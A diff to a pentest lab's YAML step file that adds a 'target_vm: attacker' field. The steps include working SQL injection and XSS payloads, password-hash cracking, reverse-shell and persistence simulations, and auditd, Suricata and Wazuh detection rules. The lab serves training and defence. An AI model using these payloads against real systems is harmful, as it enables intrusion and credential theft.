@@ -23,6 +23,7 @@ steps:
   verify:
     type: output_contains
     expect: open
+  target_vm: attacker
   script: nmap -sV --top-ports 1000 -oN /tmp/multi_stage_recon.txt 10.20.30.80
   risk_level: low
 - order: 2
@@ -35,6 +36,7 @@ steps:
   verify:
     type: output_contains
     expect: FOUND
+  target_vm: attacker
   script: dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt -o /tmp/dirb_result.txt 2>&1 | tail -20
   risk_level: low
 - order: 3
@@ -47,6 +49,7 @@ steps:
   verify:
     type: output_contains
     expect: '0'
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80/#/search?q=<iframe%20src%3D"javascript:alert(1)">' -o /tmp/xss_test.html && grep -c 'script\|iframe\|alert' /tmp/xss_test.html
   risk_level: medium
 - order: 4
@@ -59,6 +62,7 @@ steps:
   verify:
     type: output_contains
     expect: email
+  target_vm: attacker
   script: curl -s "http://10.20.30.80/rest/products/search?q=test'))UNION%20SELECT%20id,email,password,role,'5','6','7','8','9'%20FROM%20Users--" | python3 -m json.tool | head -30
   risk_level: medium
 - order: 5
@@ -71,6 +75,7 @@ steps:
   verify:
     type: output_contains
     expect: john
+  target_vm: attacker
   script: echo '0192023a7bbd73250516f069df18b500' > /tmp/hashes.txt && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt 2>&1 | head -10
   risk_level: medium
 - order: 6
@@ -102,6 +107,7 @@ steps:
   verify:
     type: output_contains
     expect: simulation
+  target_vm: attacker
   script: 'cat > /tmp/reverse_shell_sim.py << ''PYEOF''
 
     import socket,subprocess,os
@@ -133,6 +139,7 @@ steps:
   verify:
     type: output_contains
     expect: svc_update
+  target_vm: attacker
   script: echo 'svc_update:x:1099:1099:Service Update:/home/svc_update:/bin/bash' > /tmp/persistence_account_sim.txt && echo 'Simulated backdoor account entry:' && cat /tmp/persistence_account_sim.txt
   risk_level: medium
 - order: 8
@@ -171,6 +178,7 @@ steps:
   verify:
     type: output_contains
     expect: multi-user.target
+  target_vm: attacker
   script: 'cat > /tmp/persistence_service_sim.service << ''EOF''
 
     [Unit]
@@ -209,6 +217,7 @@ steps:
   verify:
     type: output_contains
     expect: ed25519
+  target_vm: attacker
   script: ssh-keygen -t ed25519 -f /tmp/apt_key_sim -N '' -q && echo 'Simulated attacker public key:' && cat /tmp/apt_key_sim.pub && echo 'Would be appended to ~/.ssh/authorized_keys'
   risk_level: medium
 - order: 10
@@ -237,6 +246,7 @@ steps:
   verify:
     type: output_contains
     expect: persistence
+  target_vm: attacker
   script: 'cat > /tmp/audit_persistence_rules.conf << ''EOF''
 
     -w /etc/passwd -p wa -k persistence_account
@@ -275,6 +285,7 @@ steps:
   verify:
     type: output_contains
     expect: UNION SELECT
+  target_vm: attacker
   script: 'cat > /tmp/custom_detection.rules << ''EOF''
 
     alert http any any -> 10.20.30.0/24 any (msg:"SQLI Attempt - UNION SELECT"; flow:to_server,established; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:20; sid:1000001; rev:1;)
@@ -301,6 +312,7 @@ steps:
   verify:
     type: output_contains
     expect: multistage_attack
+  target_vm: attacker
   script: "cat > /tmp/wazuh_multistage_rule.xml << 'EOF'\n<group name=\"multistage_attack\">\n  <rule id=\"100100\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n    <if_matched_group>persistence_detection</if_matched_group>\n\
     \    <description>Multi-stage attack detected: 3+ persistence techniques in 5 minutes</description>\n    <mitre>\n      <id>T1053</id>\n      <id>T1136</id>\n      <id>T1543</id>\n    </mitre>\n  </rule>\n\
     \  <rule id=\"100101\" level=\"10\">\n    <if_sid>550</if_sid>\n    <match>useradd|adduser</match>\n    <group>persistence_detection</group>\n    <description>Persistence: New user account created</description>\n\
@@ -343,6 +355,7 @@ steps:
   verify:
     type: output_contains
     expect: Timeline
+  target_vm: attacker
   script: 'cat > /tmp/attack_timeline.txt << ''EOF''
 
     === Multi-Stage Attack Timeline ===
@@ -409,6 +422,7 @@ steps:
   verify:
     type: output_contains
     expect: Defense Matrix
+  target_vm: attacker
   script: 'cat > /tmp/defense_matrix.txt << ''EOF''
 
     === Defense Matrix: Multi-Stage Intrusion ===
@@ -453,6 +467,7 @@ steps:
   verify:
     type: output_contains
     expect: Penetration Test Report
+  target_vm: attacker
   script: "cat > /tmp/pentest_report_week02.txt << 'EOF'\n=== Penetration Test Report: Multi-Stage Intrusion ===\nDate: 2026-04-03 | Tester: Lab Student | Scope: 10.20.30.0/24\n\n1. Executive Summary\n\
     \   다단계 침투 테스트 결과, 3개의 Critical, 2개의 High 취약점 발견.\n\n2. Attack Path\n   Port Scan → Directory Enum → SQLi → Hash Extraction → Credential Crack → Persistence\n\n3. Findings\n   [C-01] SQL Injection (CVSS\
     \ 9.8) - REST API 파라미터 검증 미흡\n   [C-02] Weak Password Hash (CVSS 7.5) - MD5 해시 사용\n   [C-03] Missing FIM (CVSS 7.2) - 주요 설정 파일 무결성 감시 미적용\n   [H-01] Directory Listing (CVSS 5.3) - 디렉토리 인덱싱 활성화\n   [H-02]\
